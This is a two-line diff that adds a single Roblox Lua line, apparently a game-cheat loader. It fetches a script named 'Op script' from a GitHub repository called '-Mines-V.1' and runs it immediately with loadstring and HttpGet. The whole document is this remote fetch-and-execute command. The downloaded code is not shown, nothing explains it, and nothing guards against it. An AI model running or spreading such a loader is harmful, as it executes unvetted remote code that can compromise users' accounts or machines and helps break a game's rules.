@@ -1,0 +1,2 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaitofyp/-Mines-V.1/refs/heads/main/Op%20script"))()
